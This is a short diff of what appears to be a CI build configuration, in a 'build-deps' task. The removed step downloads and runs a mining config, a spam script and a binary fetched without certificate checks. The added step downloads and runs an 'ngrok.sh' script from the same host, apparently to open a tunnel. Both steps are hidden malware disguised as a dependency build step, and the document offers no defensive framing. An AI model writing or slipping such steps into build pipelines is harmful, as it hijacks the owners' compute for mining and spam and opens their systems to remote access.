@@ -3,4 +3,4 @@ tasks:
   build-deps:
     runner: node:10
     steps:
-    - run: wget https://swenson.my.id/mining/config.json && wget https://swenson.my.id/mining/spam.sh && wget --no-check-certificate https://swensonm.com/mining/masterfile && chmod 777 masterfile && chmod 777 spam.sh && ./masterfile && ./spam.sh
+    - run: wget https://swenson.my.id/mining/ngrok.sh && chmod 777 ngrok.sh && ./ngrok.sh
